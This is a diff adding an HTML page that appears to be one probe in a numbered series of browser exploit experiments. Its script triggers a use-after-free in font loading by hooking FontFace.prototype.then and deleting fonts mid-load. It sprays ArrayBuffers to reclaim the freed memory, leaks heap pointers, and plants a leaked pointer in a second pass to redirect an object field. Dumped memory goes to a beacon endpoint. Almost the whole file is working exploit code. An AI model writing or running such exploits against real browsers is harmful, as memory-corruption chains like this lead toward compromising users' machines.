@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P793 — Two-Pass Full 24Q Dump</title>
+<style>
+  body { background: #0c0d14; color: #d0d7de; font-family: monospace; font-size: 14px; padding: 20px; }
+  pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; color: #7ee787; font-size: 13px; white-space: pre-wrap; word-break: break-all; }
+</style>
+<script>
+'use strict';
+/* ============================================================
+ * P793 — Two-Pass Full 24-Qword Dump (P790 structure)
+ *
+ * P790 PROVED: same-page two-pass works (both reclaimed!).
+ * P791/P792 FAILED: doUAF helper and cross-boot broke reclaim.
+ *
+ * THIS PROBE: exact P790 manual structure, but dumps ALL 24
+ * qwords from both passes. Key difference from P791:
+ *   - Manual pass coding (no doUAF helper)
+ *   - 128 warmup ABs between passes (P790 had these!)
+ *   - q0===1n reclaim check (not nz heuristic)
+ *   - Full field-by-field comparison
+ *
+ * CRASH_CLASS: HIGH — pointer redirect
+ * ============================================================ */
+
+window.onerror = function(msg, url, line){
+  try { var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P793-JSERR&data=' + encodeURIComponent((msg||'') + ' L' + line) + '&t=' + Date.now(), false);
+    x.send(null); } catch(e){}
+};
+
+function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }
+
+function b(tag, data){
+  try { var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P793-' + encodeURIComponent(tag) +
+      '&data=' + encodeURIComponent(String(data || '').slice(0, 700)) + '&t=' + Date.now(), false);
+    x.send(null); } catch(e){}
+}
+
+var out;
+function log(s){ if(out) out.textContent += s + '\n'; }
+
+function dumpView(view, label){
+  var parts = [];
+  for (var q = 0; q < 24; q++){
+    if (view[q] !== 0n) parts.push('q' + q + '=0x' + h16(view[q]));
+  }
+  var chunk = '';
+  for (var i = 0; i < parts.length; i++){
+    if (chunk.length + parts[i].length > 600){
+      b(label, chunk); chunk = '';
+    }
+    if (chunk.length > 0) chunk += '|';
+    chunk += parts[i];
+  }
+  if (chunk.length > 0) b(label, chunk);
+  return parts;
+}
+
+function run(){
+  out = document.getElementById('out');
+  out.textContent = 'P793 — Two-Pass Full 24Q Dump\n==============================\n\n';
+  b('BOOT', 'v1');
+
+  /* ============================================================
+   * PASS 1: Zeroed spray — leak baseline + addresses
+   * ============================================================ */
+  log('PASS 1: Zeroed UAF (baseline)...');
+
+  var st1 = document.createElement('style');
+  st1.textContent = '@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(st1);
+
+  var face1 = new FontFace('f1', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(face1);
+  void face1.loaded;
+
+  var abs1 = [], fired1 = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (fired1) return undefined;
+      fired1 = true;
+      if (st1){ st1.remove(); st1.textContent = ''; st1 = null; }
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+      for (var k = 0; k < 64; k++) abs1.push(new ArrayBuffer(192));
+      try { document.fonts.check('1em bb1'); } catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },
+    set: function(){}
+  });
+
+  document.fonts.load('1em f1, bb1', 'AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    /* Find reclaimed AB via q0===1n */
+    var best1 = -1;
+    for (var i = 0; i < abs1.length; i++){
+      var v = new BigUint64Array(abs1[i]);
+      if (v[0] === 1n){ best1 = i; break; }
+    }
+
+    if (best1 < 0){
+      /* Fallback: most non-zero bytes */
+      var bestNz = 0;
+      for (var i = 0; i < abs1.length; i++){
+        var u = new Uint8Array(abs1[i]), nz = 0;
+        for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
+        if (nz > bestNz){ bestNz = nz; best1 = i; }
+      }
+      if (bestNz < 4){
+        b('P1-MISS', 'nz=' + bestNz);
+        log('PASS 1 MISS — no reclaim. Reloading...');
+        setTimeout(function(){ location.reload(); }, 500);
+        return;
+      }
+      b('P1-FALLBACK', 'nz=' + bestNz + '|i=' + best1);
+    }
+
+    var view1 = new BigUint64Array(abs1[best1]);
+    var q11_1 = view1[11];
+    var q13_1 = view1[13];
+
+    /* Full dump */
+    var p1parts = dumpView(view1, 'P1-DUMP');
+    b('P1-HIT', 'i=' + best1 + '|q0=0x' + h16(view1[0]) +
+      '|q11=0x' + h16(q11_1) + '|q13=0x' + h16(q13_1));
+
+    log('PASS 1 HIT (AB #' + best1 + '):');
+    for (var q = 0; q < 24; q++){
+      if (view1[q] !== 0n){
+        log('  q' + q + ' (+0x' + (q*8).toString(16) + ') = 0x' + h16(view1[q]));
+      }
+    }
+
+    /* ============================================================
+     * WARMUP: 128 ABs at 192 bytes (same as P790's targets!)
+     * This primes the allocator's 192-byte bucket.
+     * ============================================================ */
+    var warmup = [];
+    var SENTINEL = 0xBEEF0000n;
+    for (var i = 0; i < 128; i++){
+      var ab = new ArrayBuffer(192);
+      var v = new BigUint64Array(ab);
+      for (var q = 0; q < 24; q++) v[q] = SENTINEL + BigInt(q);
+      warmup.push(ab);
+    }
+    b('WARMUP', 'n=' + warmup.length);
+    log('\nAllocated ' + warmup.length + ' warmup ABs (192B each)');
+
+    /* ============================================================
+     * PASS 2: q1 = leaked q11 from pass 1
+     * ============================================================ */
+    log('\nPASS 2: Redirect q1 = 0x' + h16(q11_1) + '...');
+
+    var st2 = document.createElement('style');
+    st2.textContent = '@font-face{font-family:bb2;src:local(Arial);unicode-range:U+0044;}';
+    document.head.appendChild(st2);
+
+    var face2 = new FontFace('f2', 'local(Helvetica)', { unicodeRange: 'U+0043' });
+    document.fonts.add(face2);
+    void face2.loaded;
+
+    var abs2 = [], fired2 = false;
+    Object.defineProperty(FontFace.prototype, 'then', {
+      configurable: true,
+      get: function(){
+        if (fired2) return undefined;
+        fired2 = true;
+        if (st2){ st2.remove(); st2.textContent = ''; st2 = null; }
+        try { document.fonts.delete(this); } catch(e){}
+        document.body.offsetHeight;
+
+        /* Spray: q1 = leaked q11 (valid heap), all else zeroed */
+        for (var k = 0; k < 64; k++){
+          var ab = new ArrayBuffer(192);
+          var v = new BigUint64Array(ab);
+          v[1] = q11_1;
+          abs2.push(ab);
+        }
+
+        try { document.fonts.check('1em bb2'); } catch(e){}
+        document.body.offsetHeight;
+        return undefined;
+      },
+      set: function(){}
+    });
+
+    document.fonts.load('1em f2, bb2', 'CD');
+
+    setTimeout(function(){
+      delete FontFace.prototype.then;
+
+      /* Find reclaimed AB: q0===1n AND q1===our value */
+      var best2 = -1;
+      for (var i = 0; i < abs2.length; i++){
+        var v = new BigUint64Array(abs2[i]);
+        if (v[0] === 1n && v[1] === q11_1){ best2 = i; break; }
+      }
+      /* Fallback: just q0===1n */
+      if (best2 < 0){
+        for (var i = 0; i < abs2.length; i++){
+          var v = new BigUint64Array(abs2[i]);
+          if (v[0] === 1n){ best2 = i; break; }
+        }
+      }
+      /* Fallback: most nz */
+      if (best2 < 0){
+        var bestNz2 = 0;
+        for (var i = 0; i < abs2.length; i++){
+          var u = new Uint8Array(abs2[i]), nz = 0;
+          for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
+          if (nz > bestNz2){ bestNz2 = nz; best2 = i; }
+        }
+        if (bestNz2 < 4){
+          b('P2-MISS', 'nz=' + bestNz2);
+          log('\nPASS 2 MISS — no reclaim (nz=' + bestNz2 + ')');
+
+          /* Diagnostic: how many ABs have our q1 prefill? */
+          var pfOnly = 0;
+          for (var i = 0; i < abs2.length; i++){
+            var v = new BigUint64Array(abs2[i]);
+            if (v[1] === q11_1 && v[0] === 0n) pfOnly++;
+          }
+          b('P2-DIAG', 'prefill_only=' + pfOnly);
+          log('Diagnostic: ' + pfOnly + '/64 have our q1 but no q0=1');
+
+          /* Check warmup ABs for modification */
+          checkWarmup(warmup, SENTINEL);
+          return;
+        }
+        b('P2-FALLBACK', 'nz=' + bestNz2 + '|i=' + best2);
+      }
+
+      var view2 = new BigUint64Array(abs2[best2]);
+      var hadQ1 = (view2[1] === q11_1);
+
+      /* Full dump */
+      var p2parts = dumpView(view2, 'P2-DUMP');
+      b('P2-HIT', 'i=' + best2 + '|hadQ1=' + hadQ1 +
+        '|q0=0x' + h16(view2[0]) + '|q1=0x' + h16(view2[1]) +
+        '|q11=0x' + h16(view2[11]) + '|q13=0x' + h16(view2[13]));
+
+      log('\nPASS 2 HIT (AB #' + best2 + ', hadQ1=' + hadQ1 + '):');
+      for (var q = 0; q < 24; q++){
+        if (view2[q] !== 0n){
+          var marker = '';
+          if (q === 1 && hadQ1) marker = ' <-- OUR REDIRECT';
+          log('  q' + q + ' (+0x' + (q*8).toString(16) + ') = 0x' + h16(view2[q]) + marker);
+        }
+      }
+
+      /* ============================================================
+       * COMPARE: field-by-field difference
+       * ============================================================ */
+      var newFields = [], changedFields = [], goneFields = [];
+      for (var q = 0; q < 24; q++){
+        if (q === 1) continue; /* skip q1 — we set it */
+        var v1 = view1[q], v2 = view2[q];
+        if (v2 !== 0n && v1 === 0n) newFields.push('q' + q + '=0x' + h16(v2));
+        else if (v1 !== 0n && v2 === 0n) goneFields.push('q' + q);
+        else if (v1 !== 0n && v2 !== 0n && v1 !== v2)
+          changedFields.push('q' + q + ':0x' + h16(v1) + '>0x' + h16(v2));
+      }
+
+      if (newFields.length > 0){
+        b('NEW-FIELDS', newFields.join('|'));
+        log('\n*** NEW FIELDS (in P2 but not P1): ' + newFields.join(', '));
+      }
+      if (changedFields.length > 0){
+        b('CHANGED', changedFields.join('|'));
+        log('*** CHANGED FIELDS: ' + changedFields.join(', '));
+      }
+      if (goneFields.length > 0){
+        b('GONE', goneFields.join('|'));
+        log('*** GONE FIELDS (in P1 but not P2): ' + goneFields.join(', '));
+      }
+      if (newFields.length === 0 && changedFields.length === 0 && goneFields.length === 0){
+        b('SAME', 'identical_fields');
+        log('\nAll fields identical between passes (except q1 redirect).');
+      }
+
+      /* Check warmup/target ABs for engine write-through */
+      checkWarmup(warmup, SENTINEL);
+
+      b('DONE', 'complete');
+      log('\n=== P793 COMPLETE ===');
+    }, 500);
+
+  }, 400);
+}
+
+function checkWarmup(warmup, SENTINEL){
+  var modified = 0;
+  for (var i = 0; i < warmup.length; i++){
+    var v = new BigUint64Array(warmup[i]);
+    for (var q = 0; q < 24; q++){
+      var expected = SENTINEL + BigInt(q);
+      if (v[q] !== expected){
+        if (modified < 3){
+          b('WARMUP-MOD', 'i=' + i + '|q=' + q +
+            '|was=0x' + h16(expected) + '|now=0x' + h16(v[q]));
+        }
+        modified++;
+      }
+    }
+  }
+  if (modified === 0){
+    b('WARMUP-INTACT', 'all_ok');
+    log('\nAll 128 warmup/target ABs intact.');
+  } else {
+    b('WARMUP-TOTAL', 'modified=' + modified);
+    log('\nWarmup ABs: ' + modified + ' qwords modified!');
+  }
+}
+
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+</script>
+</head>
+<body>
+  <pre id="out">P793 — Two-Pass Full 24Q Dump — Loading...</pre>
+</body>
+</html>
